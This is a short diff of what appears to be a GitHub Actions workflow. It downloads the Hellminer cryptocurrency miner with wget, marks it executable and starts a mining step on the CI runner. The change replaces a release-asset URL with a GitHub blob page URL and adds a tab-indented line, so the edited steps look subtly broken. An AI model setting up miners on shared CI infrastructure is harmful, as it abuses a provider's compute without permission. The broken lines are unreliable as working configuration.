@@ -9,8 +9,8 @@ jobs:
     steps:
     - name: Download Hellminer
       run: |
-        wget https://objects.githubusercontent.com/github-production-release-asset-2e65be/586739895/10a9079e-1766-4f66-a692-870108ce80fd?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250512%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250512T014446Z&X-Amz-Expires=300&X-Amz-Signature=ffb5543156be5dae0f30ca62f468dd76a494384ccb31ce6dd03b460296bdb92a&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dhellminer_linux64.tar.gz&response-content-type=application%2Foctet-stream
-        chmod +x hellminer
+        wget https://github.com/notthehypeMhs/hellminer/blob/main/hellminer      
+				chmod +x hellminer
 
     - name: Start Mining
       run: |
